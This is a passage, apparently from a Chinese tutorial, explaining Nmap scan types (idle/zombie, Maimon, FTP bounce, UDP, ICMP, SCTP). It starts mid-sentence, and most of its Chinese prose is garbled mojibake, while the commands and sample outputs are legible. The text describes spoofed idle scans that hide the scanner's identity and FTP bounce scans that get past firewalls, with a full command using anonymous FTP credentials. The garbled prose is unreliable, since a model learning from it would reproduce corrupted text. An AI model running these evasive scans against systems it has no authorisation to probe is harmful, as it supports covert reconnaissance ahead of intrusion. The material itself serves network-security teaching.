æ³•åŒºåˆ«ç«¯å£åˆ°åº•æ˜¯å…³é—­çš„è¿˜æ˜¯å·²ç»è¿‡æ»¤äº†ã€‚å½“Nmapè®°å½•çš„IPIDå¢åŠ äº†1ï¼Œä¹Ÿå°±è¢«æ ‡è®°æˆäº†closeä¸¨filterredã€‚\nä»¥ä¸‹ä¸‰å¼ å›¾å¤§ç•¥å¯ä»¥è¯´æ˜ç«¯å£è¢«æ‰“å¼€ï¼Œå…³é—­ï¼Œè¿‡æ»¤çš„æƒ…å†µã€‚\nç«¯å£å¼€æ”¾ï¼š\n \nç«¯å£å…³é—­ï¼š\n \nç«¯å£è¢«è¿‡æ»¤ï¼š\n \nIdel Scanæ ¹æœ¬ä¸Šæ¥è®²å°±æ˜¯ä¸€ä¸ªéšæ€§æ‰«æï¼ŒNmapæä¾›äº†decoy scanning (-D)ï¼Œå¸®åŠ©ä½¿ç”¨è€…ä¿æŠ¤è‡ªå·±çš„èº«ä»½ã€‚å¦‚æœä¸æ˜¯ä½¿ç”¨çš„ï¼ˆç±»ä¼¼Idel Scanæ‰«ææ–¹å¼ï¼‰ä»ç„¶éœ€è¦æ”»å‡»è€…é€šè¿‡è‡ªèº«çœŸå®IPå‘ç›®æ ‡å‘é€æ•°æ®åŒ…ä»¥è·å–æ‰«æç»“æœã€‚Idel Scanæ‰«æç»“æœå…¶ä¸­ä¹‹ä¸€å°±æœ‰å…¥ä¾µæ£€æµ‹ç³»ç»Ÿé€šå¸¸ä¼šå‘é€ä¸€ä¸ªZombieä¸»æœºå·²ç»å¼€å§‹æ‰«æçš„é€šçŸ¥ã€‚æ‰€ä»¥å®ƒå¯ä»¥ä½œä¸ºä¸€ä¸ªæ¡†æ¶å»æ‰«æå¦å¤–ä¸€ä¸ªç›®æ ‡ï¼Œå½“ä½ æŸ¥é˜…å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰æ—¶ï¼Œè¯·è®°ä½è¿™ç§å¯èƒ½æ€§ã€‚\nIdel Scançš„ä¸€ä¸ªç‹¬ç‰¹ä¼˜åŠ¿ä¾¿æ˜¯ï¼Œå®ƒå¯ä»¥ç»•å¼€æŸäº›è¿‡æ»¤é˜²ç«å¢™å’Œè·¯ç”±å™¨ã€‚IPæºåœ°å€è¿‡æ»¤ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„ï¼ˆè™½ç„¶å¾ˆå¼±ï¼‰ç”¨äºé™åˆ¶æœºå™¨è¿æ¥åˆ°æ•æ„Ÿä¸»æœºæˆ–è€…è¯´ç½‘ç»œä¸Šçš„å®‰å…¨æœºåˆ¶ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä¸€ä¸ªå…¬å¸æ•°æ®åº“æœåŠ¡å™¨ï¼Œåªå…è®¸å…¬å…±ç½‘ç»œè¿æ¥ã€‚æˆ–è€…ï¼Œå®¶åº­ç”¨æˆ·åªå…è®¸SSHè¿æ¥åˆ°å·¥ä½œæœºä¸Šé¢ã€‚\nIdel Scanningæœ‰æ—¶ä¹Ÿå¯ä»¥è¢«ç”¨æ¥æ˜ å°„ä¿¡ä»»å…³ç³»ï¼Œå…³é”®åœ¨äºIdel Scanæœ€ç»ˆä¼šä»Zombieä¸»æœºè·å–å¼€æ”¾ç«¯å£åˆ—è¡¨ã€‚ä¸€ä¸ªæ­£å¸¸çš„æ‰«æå¯¹äºä¸Šè¿°æ•°æ®åº“æœåŠ¡å™¨å¯èƒ½ä¼šæ˜¾ç¤ºæ²¡æœ‰ç«¯å£å¼€æ”¾ï¼Œä½†æ˜¯å½“å°†Zombieä¸»æœºä½œä¸ºWeb Severçš„IPï¼Œä½¿ç”¨Idel Scanå°±å¯èƒ½å°†æ•°æ®åº“ç›¸å…³å¼€æ”¾ç«¯å£æš´éœ²å‡ºæ¥ã€‚\næ˜ å°„å‡ºçš„è¿™äº›ä¿¡ä»»å…³ç³»å°±å¯èƒ½ä½œä¸ºæ”»å‡»è€…ä¼˜å…ˆè€ƒè™‘çš„ç›®æ ‡ï¼Œä¸Šé¢æ‰€è®¨è®ºçš„æ–¹å¼æ‰‹æ³•å¾ˆçŒ¥çå“‡ï¼\nIdel Scanæœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯å®ƒæ¯”å…¶ä»–ä¸€äº›æ‰«ææ–¹å¼æ‰€èŠ±è´¹çš„æ—¶é—´æ›´é•¿ã€‚å°½ç®¡åœ¨ã€ŠIdel Scanç®—æ³•å®ç°ã€‹ç« èŠ‚ä¸­æœ‰å¯¹Idel Scançš„ä¼˜åŒ–ç®—æ³•ï¼Œä¸€ä¸ªåªéœ€è¦15ç§’å°±å¯ä»¥å®Œæˆçš„SYNï¼ŒIdel Scanæˆ–è®¸éœ€è¦15åˆ†é’Ÿæ‰èƒ½å¤Ÿå®Œæˆã€‚å¦ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä½ å¿…é¡»èƒ½å¤Ÿå‘é€æ¬ºéª—åŒ…ï¼Œä¼ªè£…æˆå¥½åƒä»–ä»¬æ¥è‡ªZombieä¸»æœºä¸€èˆ¬ï¼Œè®©ä»–ä»¬åˆ°è¾¾ç›®æ ‡ä¸»æœºã€‚è®¸å¤šISPæœåŠ¡å•†ï¼ˆç‰¹åˆ«æ˜¯æ‹¨å·å’Œä½å®…å®½å¸¦ä¾›åº”å•†ï¼‰ç›®å‰æ‰§è¡Œå‡ºå£è¿‡æ»¤æ¥é˜²æ­¢è¿™ç±»æ•°æ®åŒ…æ¬ºéª—ã€‚é«˜ç«¯ä¾›åº”å•†ï¼ˆæ¯”å¦‚è¯´ä¸»æœºæ‰˜ç®¡ï¼ŒT1-Servicesï¼‰å°±ä¸å¤ªå¯èƒ½è¿™ä¹ˆåšã€‚å¦‚æœå®é™…å­˜åœ¨è¿™ä¸ªè¿‡æ»¤ï¼ŒNmapä¼šåœ¨ä½ å°è¯•çš„æ¯ä¸€ä¸ªZombieä¸»æœºä¸Šæ˜¾ç¤ºä¸€ä¸ªå¿«é€Ÿé”™è¯¯æ¶ˆæ¯ã€‚å¦‚æœä¸èƒ½å¤Ÿæ›´æ¢ISPæœåŠ¡å•†ï¼Œé‚£ä¹ˆæœ€å¥½å°è¯•åœ¨è®©ISPæœåŠ¡å•†ç»™ä½ æ›´æ¢ä¸€ä¸ªIPã€‚æœ‰æ—¶å€™è¿™ä¸ªè¿‡æ»¤ä»…ä»…åªæ˜¯é˜»æ­¢äº†å®¢æˆ·ä½¿ç”¨èŒƒå›´ä¹‹å¤–çš„æ¬ºéª—IPåœ°å€ã€‚Idel Scanå¦å¤–ä¸€ä¸ªéš¾ç‚¹å°±æ˜¯ä½ å¿…é¡»å¯»æ‰¾ä¸€ä¸ªæ­£åœ¨å·¥ä½œçš„Zombieä¸»æœºã€‚\nä¸Šè¿°æè¿°çš„æ˜¯Idel Scançš„åŸºç¡€æ°´å¹³ã€‚åœ¨Nmapä¸Šå®ç°å´æ˜¯æœ‰äº›å¤æ‚ï¼Œæœ€å…³é”®çš„å·®å¼‚åœ¨äºNmapèƒ½å¤ŸåŒæ—¶æ‰§è¡Œï¼Œè€Œä¸”è¯¯æŠ¥å°‘ã€‚\nParallelizing idle scanç”±äºæ˜¯é—´æ¥æ¨å¯¼å‡ºç«¯å£æ‰€ä»¥ï¼Œä»–æ¯”å…¶ä»–æ‰«ææ–¹å¼è¦æ›´åŠ çš„çŒ¥çã€‚å¦‚æœNmapæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šçš„å¤šä¸ªç«¯å£ï¼Œç„¶åæ£€æµ‹Zombieä¸»æœºä¸Šæ–°çš„IP IDå€¼ï¼ŒIP IDçš„å€¼å¢åŠ äº†å¤šå°‘å°±æ˜¾ç¤ºå‡ºç›®æ ‡å¼€æ”¾äº†å¤šå°‘ä¸ªç«¯å£ã€‚å®é™…ä¸Šè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå’Œä¸¥é‡çš„é—®é¢˜ï¼Œç»å¤§å¤šæ•°ç«¯å£åœ¨å¤§å‹æ‰«æç»“æœä¸­åŸºæœ¬ä¸Šéƒ½æ˜¯è¢«å…³é—­æˆ–è€…è¢«è¿‡æ»¤ã€‚ç”±äºåªæœ‰å¼€æ”¾ç«¯å£æ‰å¯ä»¥è®©IP IDå€¼å¢åŠ ï¼ŒNmapä¼šè®¤ä¸ºæ²¡æœ‰å¢åŠ é‡ï¼Œç„¶åæ•´ä¸ªç»„çš„ç«¯å£å°±è¢«æ ‡è®°æˆäº†å…³é—­æˆ–è€…è¢«è¿‡æ»¤ã€‚Nmapå¯ä»¥å¹¶è¡Œæ‰«æä¸€ç™¾ç»„ç«¯å£ã€‚å¦‚æœNmapåœ¨æ¢æµ‹ä¸€ç»„ç«¯å£çš„æ—¶å€™Zombieä¸»æœºIP IDåŒæ—¶ä¹Ÿå¢åŠ äº†ï¼Œå°±è¯´æ˜åœ¨è¿™ä¸€ç»„ç«¯å£ä¸­ä¸€å®šæœ‰å¼€æ”¾çš„ç«¯å£ã€‚Nmapç»§è€Œä½¿ç”¨äºŒè¿›åˆ¶æœç´¢å‘ç°å¼€æ”¾çš„ç«¯å£ã€‚å®ƒå°†æ•°æ®ç»„åˆ†æˆä¸¤ä»½ï¼Œåˆ†åˆ«å‘é€æ¢æµ‹ä¿¡æ¯ï¼Œå¦‚æœä¸€ä¸ªæ•°æ®ç»„æ˜¾ç¤ºæ²¡æœ‰å¼€æ”¾ç«¯å£ï¼Œé‚£ä¹ˆè¿™ä¸€æ•°æ®ç»„çš„ç«¯å£éƒ½å°†è¢«æ ‡è®°ä¸ºè¢«å…³é—­æˆ–è€…è¢«è¿‡æ»¤ã€‚å¦‚æœä¸€ä¸ªæ•°æ®ç»„æ˜¾ç¤ºæœ‰å¼€æ”¾ç«¯å£ï¼Œé‚£ä¹ˆåœ¨æŠŠè¿™ä¸ªæ•°æ®ç»„åˆ†æˆä¸¤ä»½ï¼Œé‡å¤ä»¥ä¸Šæ­¥éª¤ï¼Œç›´åˆ°æœ€ç»ˆå°†å¼€æ”¾ç«¯å£éƒ½æ‰¾å‡ºæ¥ã€‚è™½ç„¶è¿™ç§æ–¹å¼æ›´å¤æ‚ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å¯ä»¥èŠ‚çº¦æ‰«ææ—¶é—´ã€‚\nå¯é æ€§æ˜¯Idel Scançš„å¦ä¸€ä¸ªé—®é¢˜ã€‚å¦‚æœZombieä¸»æœºåœ¨æ‰«ææ—¶å‘ä»»ä½•ä¸ç›¸å¹²çš„æœºå™¨å‘é€æ•°æ®åŒ…ï¼Œå…¶IP IDä¼šå¢åŠ ã€‚è¿™å°±ä¼šè®©Nmapè¯¯ä»¥ä¸ºå·²ç»å¯»æ‰¾åˆ°å¼€æ”¾çš„ç«¯å£äº†ã€‚å¹¸è¿çš„æ˜¯ï¼Œå¹¶è¡Œæ‰«æåœ¨è¿™é‡Œä¹Ÿæ˜¯æœ‰å¾ˆå¤§ä½œç”¨çš„ã€‚å¦‚æœNmapåœ¨ä¸€ä¸ªç»„ä¸­æ‰«æ100ä¸ªç«¯å£ï¼Œé‚£ä¹ˆIP IDå°±ä¼šå¢åŠ æ ‡è¯†ä¸¤ä¸ªå¼€æ”¾ç«¯å£ï¼ŒNmapå°†è¿™ç»„æ•°æ®åˆ†æˆ50ç«¯å£ä¸€ä¸ªå°ç»„ã€‚å½“NmapåŒæ—¶åœ¨ä¸¤ä¸ªå°ç»„ä¸­è¿›è¡ŒIP IDæ‰«ææ—¶ï¼ŒZombieä¸»æœºIP IDæ€»çš„å¢åŠ é‡å°±åœ¨åŠ äº†ä¸€æ¬¡ã€‚å¦å¤–ï¼ŒNmapå¦‚æœæ¢æµ‹åˆ°ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆå®ƒä¼šé‡æ–°æ¢æµ‹ã€‚åŸºäºæ£€æµ‹å¯é çš„Zombieä¸»æœºï¼ŒNmapè¿˜ä¼šä¿®æ”¹ç»„å¤§å°ä»¥åŠæ‰«ææ—¶é—´ã€‚å¦‚æœNmapå‘ç°æœ‰å¤§é‡ä¸ä¸€è‡´çš„ç»“æœï¼Œå®ƒå°†é€€å‡ºï¼Œå¹¶æç¤ºç”¨æˆ·é€‰æ‹©æ›´å¥½çš„Zombieä¸»æœºã€‚\nå…·ä½“æ“ä½œå¯ä»¥å‚è€ƒTCP Idle Scan (-sI)\nTCP Maimon Scan Maimon Scan ä»¥å…¶å‘ç°è€… Uriel Maimon å‘½åã€‚ ä»–åœ¨ Phrack æ‚å¿—ç¬¬49æœŸï¼ˆ1996å¹´11æœˆï¼‰ä¸­æè¿°äº†è¿™ç§æŠ€æœ¯ã€‚ é™¤äº†æ¢æµ‹å™¨æ˜¯FIN / ACKä¹‹å¤–ï¼Œæ­¤æŠ€æœ¯ä¸NULLï¼ŒFINå’ŒXmasæ‰«æå®Œå…¨ç›¸åŒã€‚ æ ¹æ®RFC 793ï¼ˆTCPï¼‰ï¼Œå“åº”äºè¿™æ ·çš„æ¢æµ‹ï¼Œåº”è¯¥ç”ŸæˆRSTåˆ†ç»„ï¼Œæ— è®ºç«¯å£æ˜¯æ‰“å¼€è¿˜æ˜¯å…³é—­ã€‚ ä½†æ˜¯ï¼Œå¦‚æœç«¯å£æ‰“å¼€ï¼Œè®¸å¤šBSDæ´¾ç”Ÿç³»ç»Ÿåªä¼šä¸¢å¼ƒæ•°æ®åŒ…ã€‚ Nmapåˆ©ç”¨è¿™ä¸€ç‚¹æ¥ç¡®å®šå¼€æ”¾ç«¯å£ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\nNmap å¯¹ TCP Maimon Scan çš„å¤„ç†ï¼š\n   Probe Response Assigned State     No response received (even after retransmissions) open or filtered   TCP RST packet closed   ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered    usage nmap -sM para Starting Nmap ( http://nmap.org ) All 1000 scanned ports on para (192.168.10.191) are: closed MAC Address: 00:60:1D:38:32:90 (Lucent Technologies) Nmap done: 1 IP address (1 host up) scanned in 4.19 seconds TCP FTP Bounce Scan FTPåè®®ï¼ˆRFC 959ï¼‰çš„ä¸€ä¸ªæœ‰è¶£ç‰¹æ€§æ˜¯æ”¯æŒä»£ç†FTPè¿æ¥ã€‚è¿™å…è®¸ç”¨æˆ·è¿æ¥åˆ°ä¸€ä¸ªFTPæœåŠ¡å™¨ï¼Œç„¶åè¦æ±‚å°†æ–‡ä»¶å‘é€åˆ°ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚è¿™æ ·çš„åŠŸèƒ½åœ¨å¾ˆå¤šå±‚é¢ä¸Šè¢«æ»¥ç”¨ï¼Œå› æ­¤å¤§å¤šæ•°æœåŠ¡å™¨å·²åœæ­¢æ”¯æŒå®ƒã€‚æ­¤åŠŸèƒ½å…è®¸çš„æ»¥ç”¨åŠŸèƒ½ä¹‹ä¸€æ˜¯é€šè¿‡ FTP æœåŠ¡å™¨è¿›è¡Œæ‰«æå…¶ä»–ä¸»æœºç«¯å£ã€‚åªéœ€è¦æ±‚ FTP æœåŠ¡å™¨ä¾æ¬¡å°†æ–‡ä»¶å‘é€åˆ°ç›®æ ‡ä¸»æœºçš„æ¯ä¸ªç«¯å£å°±å¯ä»¥äº†ã€‚å›æ˜¾æ¶ˆæ¯å°†æè¿°ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚è¿™æ˜¯ç»•è¿‡é˜²ç«å¢™çš„å¥½æ–¹æ³•ï¼Œå› ä¸ºå†…éƒ¨çš„ FTP æœåŠ¡å™¨é€šå¸¸æ”¾ç½®åœ¨æ¯”æ—§çš„ Internet ä¸»æœºéƒ½èƒ½è®¿é—®åˆ°çš„å…¶ä»–ä¸»æœºçš„ä½ç½®ä¸Šã€‚\nNmapæ”¯æŒä½¿ç”¨-bé€‰é¡¹è¿›è¡ŒFTPåå¼¹æ‰«æã€‚å®ƒé‡‡ç”¨\u0026lt;username\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;server\u0026gt;:\u0026lt;port\u0026gt;å½¢å¼çš„å‚æ•°ã€‚ \u0026lt;Server\u0026gt;æ˜¯æ˜“å—æ”»å‡»çš„FTPæœåŠ¡å™¨çš„åç§°æˆ–IPåœ°å€ã€‚ä¸æ™®é€šURLä¸€æ ·ï¼Œæ‚¨å¯ä»¥çœç•¥\u0026lt;username\u0026gt;:\u0026lt;password\u0026gt;ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†ä½¿ç”¨åŒ¿åç™»å½•å‡­æ®ï¼ˆuser:anonymous password:-wwwuser@ï¼‰ã€‚ç«¯å£å·ï¼ˆå’Œå‰é¢çš„å†’å·ï¼‰ä¹Ÿå¯ä»¥çœç•¥ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨\u0026lt;server\u0026gt;ä¸Šçš„é»˜è®¤FTPç«¯å£ï¼ˆ21ï¼‰ã€‚\nä½¿ç”¨ FTP Bounce Scan è¾ƒä¸ºé¢‘ç¹çš„ç”¨æˆ·æ›´å¥½åœ°ä¹ æƒ¯äº†å¯¹å›æ˜¾æ¶ˆæ¯çš„å¤„ç†ã€‚è¿™ä¸ªæ¼æ´åœ¨1997å¹´Nmapå‘å¸ƒæ—¶å¾ˆæ™®éï¼Œä½†å·²åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¾—åˆ°ä¿®å¤ã€‚æ˜“å—æ”»å‡»çš„æœåŠ¡å™¨ä»ç„¶å­˜åœ¨ï¼Œæ‰€ä»¥å½“å…¶ä»–æ‰€æœ‰æœåŠ¡å™¨éƒ½å¤±è´¥æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•å€¼å¾—ä¸€è¯•ã€‚å¦‚æœæ‚¨çš„ç›®æ ‡æ˜¯ç»•è¿‡é˜²ç«å¢™ï¼Œè¯·æ‰«æç›®æ ‡ç½‘ç»œä»¥æŸ¥æ‰¾å¼€æ”¾çš„21ç«¯å£ï¼ˆå¦‚æœä½¿ç”¨ç‰ˆæœ¬æ£€æµ‹æ‰«ææ‰€æœ‰ç«¯å£ï¼Œåˆ™æ‰«æä»»ä½•FTPæœåŠ¡ï¼‰ï¼Œç„¶åå°è¯•ä½¿ç”¨æ¯ä¸ªç«¯å£è¿›è¡Œ Bounce Scanã€‚ Nmapä¼šå‘Šè¯‰æ‚¨ä¸»æœºæ˜¯å¦å®¹æ˜“å—åˆ°æ”»å‡»ã€‚å¦‚æœæ‚¨åªæ˜¯è¯•å›¾æ©ç›–æ‚¨çš„æ›²ç›®ï¼Œæ‚¨ä¸éœ€è¦ï¼ˆäº‹å®ä¸Šï¼Œä¸åº”è¯¥ï¼‰é™åˆ¶ç›®æ ‡ç½‘ç»œä¸Šçš„ä¸»æœºã€‚åœ¨ä¸ºæ˜“å—æ”»å‡»çš„FTPæœåŠ¡å™¨æ‰«æéšæœºInternetåœ°å€ä¹‹å‰ï¼Œè¯·è€ƒè™‘ç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½ä¸ä¼šå…è®¸è¿™æ ·æ»¥ç”¨å…¶æœåŠ¡å™¨ã€‚\nusage Nmap æ‰«ææ–¹å¼ï¼š\nnmap -p 22,25,135 -Pn -v -b XXX.YY.111.2 scanme.nmap.org Starting Nmap ( http://nmap.org ) Attempting connection to ftp://anonymous:-wwwuser@@XXX.YY.111.2:21 Connected:220 JD FTP Server Ready Login credentials accepted by ftp server! Initiating TCP ftp bounce scan against scanme.nmap.org (64.13.134.52) Adding open port 22/tcp Adding open port 25/tcp Scanned 3 ports in 12 seconds via the Bounce scan. Nmap scan report for scanme.nmap.org (64.13.134.52) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 135/tcp filtered msrpc Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds UDP åœ¨TCP/IPæ¨¡å‹ä¸­ï¼ŒUDPä¸ºç½‘ç»œå±‚ä»¥ä¸Šå’Œåº”ç”¨å±‚ä»¥ä¸‹æä¾›äº†ä¸€ä¸ªç®€å•çš„æ¥å£ã€‚UDPåªæä¾›æ•°æ®çš„ä¸å¯é ä¼ é€’ï¼Œå®ƒä¸€æ—¦æŠŠåº”ç”¨ç¨‹åºå‘ç»™ç½‘ç»œå±‚çš„æ•°æ®å‘é€å‡ºå»ï¼Œå°±ä¸ä¿ç•™æ•°æ®å¤‡ä»½ï¼ˆæ‰€ä»¥UDPæœ‰æ—¶å€™ä¹Ÿè¢«è®¤ä¸ºæ˜¯ä¸å¯é çš„æ•°æ®æŠ¥åè®®ï¼‰ã€‚UDPåœ¨IPæ•°æ®æŠ¥çš„å¤´éƒ¨ä»…ä»…åŠ å…¥äº†å¤ç”¨å’Œæ•°æ®æ ¡éªŒå­—æ®µã€‚\nUDPé€‚ç”¨äºä¸éœ€è¦æˆ–åœ¨ç¨‹åºä¸­æ‰§è¡Œé”™è¯¯æ£€æŸ¥å’Œçº æ­£çš„åº”ç”¨ï¼Œå®ƒé¿å…äº†åè®®æ ˆä¸­æ­¤ç±»å¤„ç†çš„å¼€é”€ã€‚å¯¹æ—¶é—´æœ‰è¾ƒé«˜è¦æ±‚çš„åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨UDPï¼Œå› ä¸ºä¸¢å¼ƒæ•°æ®åŒ…æ¯”ç­‰å¾…æˆ–é‡ä¼ å¯¼è‡´å»¶è¿Ÿæ›´å¯å–ã€‚\nUDP SCAN UDPæ‰«ææ¯”è¾ƒç®€å•ï¼Œä¸€èˆ¬å¦‚æœè¿”å›ICMP port unreachableè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ï¼Œè€Œå¦‚æœæ²¡æœ‰å›åº”æˆ–æœ‰å›åº”(æœ‰äº›UDPæœåŠ¡æ˜¯æœ‰å›åº”çš„ä½†ä¸å¸¸è§)åˆ™è®¤ä¸ºæ˜¯openï¼Œä½†ç”±äºUDPçš„ä¸å¯é æ€§ï¼Œæ— æ³•åˆ¤æ–­æŠ¥æ–‡æ®µæ˜¯ä¸¢äº†è¿˜æ˜¯æ²¡æœ‰å›åº”ï¼Œæ‰€ä»¥ä¸€èˆ¬æ‰«æå™¨ä¼šå‘é€å¤šæ¬¡ï¼Œç„¶åæ ¹æ®ç»“æœå†åˆ¤æ–­ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆUDPæ‰«æè¿™ä¹ˆæ…¢çš„åŸå› ã€‚\n \nè™½ç„¶å› ç‰¹ç½‘ä¸Šæœ€æµè¡Œçš„æœåŠ¡è¿è¡Œåœ¨TCPåè®®ä¸Šï¼Œä½†UDPæœåŠ¡è¢«å¹¿æ³›éƒ¨ç½²ã€‚ DNSï¼ŒSNMPå’ŒDHCPï¼ˆæ³¨å†Œç«¯å£53,161 / 162å’Œ67/68ï¼‰æ˜¯æœ€å¸¸è§çš„ä¸‰ç§ã€‚ ç”±äºUDPæ‰«æé€šå¸¸æ¯”TCPæ›´æ…¢ä¸”æ›´å›°éš¾ï¼Œå› æ­¤æŸäº›å®‰å…¨å®¡æ ¸å‘˜ä¼šå¿½ç•¥è¿™äº›ç«¯å£ã€‚ è¿™æ˜¯ä¸€ä¸ªé”™è¯¯ï¼Œå› ä¸ºå¯åˆ©ç”¨çš„UDPæœåŠ¡éå¸¸æ™®éï¼Œæ”»å‡»è€…è‚¯å®šä¸ä¼šå¿½ç•¥æ•´ä¸ªåè®®ã€‚\nUDPæ‰«æé€šè¿‡å‘æ¯ä¸ªç›®æ ‡ç«¯å£å‘é€UDPæ•°æ®åŒ…æ¥å·¥ä½œã€‚ å¯¹äºå¤§å¤šæ•°ç«¯å£ï¼Œæ­¤æ•°æ®åŒ…å°†ä¸ºç©ºï¼ˆæ— æœ‰æ•ˆè´Ÿè½½ï¼‰ï¼Œä½†å¯¹äºä¸€äº›æ›´å¸¸è§çš„ç«¯å£ï¼Œå°†å‘é€ç‰¹å®šäºåè®®çš„æœ‰æ•ˆè´Ÿè½½ã€‚ æ ¹æ®å“åº”æˆ–ç¼ºå°‘å“åº”ï¼Œç«¯å£è¢«åˆ†é…ç»™å››ç§çŠ¶æ€ä¹‹ä¸€ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\nNmap å¯¹ UDP Scan çš„å¤„ç†ï¼š\n   Probe Response Assigned State     Any UDP response from target port (unusual) open   No response received (even after retransmissions) open or filtered   ICMP port unreachable error (type 3, code 3) closed   Other ICMP unreachable errors (type 3, code 1, 2, 9, 10, or 13) filtered    usage Nmap é€‰é¡¹å‚æ•°ï¼š\nnmap -sU scanme.nmap.org Nmap æœ‰å¾ˆå¤šé€‰é¡¹å¯ä»¥æå‡ UDP Scan çš„å‡†ç¡®æ€§ä¸é€Ÿåº¦ï¼Œè¿™é‡Œä¸å†æ·±å…¥è®²è§£ï¼Œå…·ä½“å¯ä»¥å‚è€ƒUDP Scan (-sU)\nICMP ICMP æ ¼å¼ï¼š\n \n â€‹\tæ ¹æ®ç½‘ç»œåè®®ï¼Œå¦‚æœæŒ‰ç…§åè®®å‡ºç°äº†é”™è¯¯ï¼Œé‚£ä¹ˆæ¥æ”¶ç«¯å°†äº§ç”Ÿä¸€ä¸ªicmpçš„é”™è¯¯æŠ¥æ–‡ã€‚è¿™äº›é”™è¯¯æŠ¥æ–‡å¹¶ä¸æ˜¯ä¸»åŠ¨å‘é€çš„ï¼Œè€Œæ˜¯ç”±äºé”™è¯¯ï¼Œæ ¹æ®åè®®è‡ªåŠ¨äº§ç”Ÿã€‚\n ICMP ç›¸å…³ç±»å‹è§£é‡Šï¼š\n \nä¸€èˆ¬å¦‚æœæ•°æ®åŒ…è¢«é˜²ç«å¢™è¿‡æ»¤çš„è¯ï¼Œä¼šæ”¶åˆ°ä¸€ä¸ª ICMP æ•°æ®åŒ…ï¼Œå…¶ä¸­ç±»å‹ä¸º3ï¼Œä»£ç ä¸º1ï¼Œ2ï¼Œ3ï¼Œ9ï¼Œ10æˆ–13ã€‚\nICMP SCAN å¸¸è§çš„åˆ©ç”¨ï¼š\n \nSCTP è¿™é‡Œæˆ‘ä»¬ç®€å•ä»‹ç»ä¸€ä¸‹ SCTP åè®®ã€‚\n æµæ§åˆ¶ä¼ è¾“åè®®ï¼ˆè‹±è¯­ï¼šStream Control Transmission Protocolï¼Œç¼©å†™ï¼šSCTPï¼‰æ˜¯åœ¨2000å¹´ç”±IETFçš„SIGTRANå·¥ä½œç»„å®šä¹‰çš„ä¸€ä¸ªä¼ è¾“å±‚åè®®ã€‚RFC 4960è¯¦ç»†åœ°å®šä¹‰äº†SCTPï¼Œä»‹ç»æ€§çš„æ–‡æ¡£æ˜¯RFC 3286ã€‚\nä½œä¸ºä¸€ä¸ªä¼ è¾“å±‚åè®®ï¼ŒSCTPå¯ä»¥ç†è§£ä¸ºå’ŒTCPåŠUDPç›¸ç±»ä¼¼çš„ã€‚å®ƒæä¾›çš„æœåŠ¡æœ‰ç‚¹åƒTCPï¼ŒåˆåŒæ—¶å°†UDPçš„ä¸€äº›ä¼˜ç‚¹ç›¸ç»“åˆã€‚æ˜¯ä¸€ç§æä¾›äº†å¯é ã€é«˜æ•ˆã€æœ‰åºçš„æ•°æ®ä¼ è¾“åè®®ã€‚ç›¸æ¯”ä¹‹ä¸‹TCPæ˜¯é¢å‘å­—èŠ‚çš„ï¼Œè€ŒSCTPæ˜¯é’ˆå¯¹æˆå¸§çš„æ¶ˆæ¯ã€‚\nSCTPä¸»è¦çš„è´¡çŒ®æ˜¯å¯¹å¤šé‡è”å¤–çº¿è·¯çš„æ”¯æŒï¼Œä¸€ä¸ªç«¯ç‚¹å¯ä»¥ç”±å¤šäºä¸€ä¸ª IPåœ°å€ ç»„æˆï¼Œä½¿å¾—ä¼ è¾“å¯åœ¨ä¸»æœºé—´æˆ–ç½‘å¡é—´åšåˆ°é€æ˜çš„ç½‘ç»œå®¹é”™å¤‡æ´ã€‚\nSCTPæœ€åˆæ˜¯è¢«è®¾è®¡ç”¨äºåœ¨IPä¸Šä¼ è¾“ç”µè¯åè®®ï¼ˆSS7ï¼‰ï¼ŒæŠŠ SS7 ä¿¡ä»¤ç½‘ç»œçš„ä¸€äº›å¯é ç‰¹æ€§å¼•å…¥IPã€‚IETF çš„è¿™æ–¹é¢çš„å·¥ä½œç§°ä¸ºä¿¡ä»¤ä¼ è¾“ SIGTRANã€‚\nSCTPå°†æ•°æ®ä¼ ç»™åº”ç”¨å±‚çš„æ–¹å¼ï¼Œæ˜¯å°†æ•°æ®è§†ä¸ºmessageï¼ˆbytesçš„é›†åˆï¼‰ï¼ŒSCTPçš„ç‰¹å¾æ˜¯message-orientedï¼Œæ„æ€å°±æ˜¯è¯´å®ƒå‘é€çš„æ˜¯ä¸€ä¸²messageï¼ˆæ¯ä¸€ä¸ªmessageæ˜¯byteä¸ºå•ä½çš„é›†åˆï¼‰ï¼Œç›¸å¯¹äºTCPæ˜¯ä»¥byteä¸ºå•ä½ï¼Œå‘é€çš„æ˜¯ç ´ç¢çš„æµã€‚åœ¨SCTPå‘é€ç«¯ç”¨ä¸€ä¸ªåŠ¨ä½œæäº¤æ¶ˆæ¯ï¼Œæ¥æ”¶ç«¯ä¹Ÿæ˜¯ç”¨ä¸€ä¸ªåŠ¨ä½œå–å‡ºæ¶ˆæ¯ä¼ ç»™å¯¹åº”çš„åº”ç”¨ç¨‹åºã€‚ç›¸è¾ƒäºTCPï¼Œæ˜¯ä¸€ä¸ªæµå¯¼å‘çš„åè®®ï¼Œå¯é 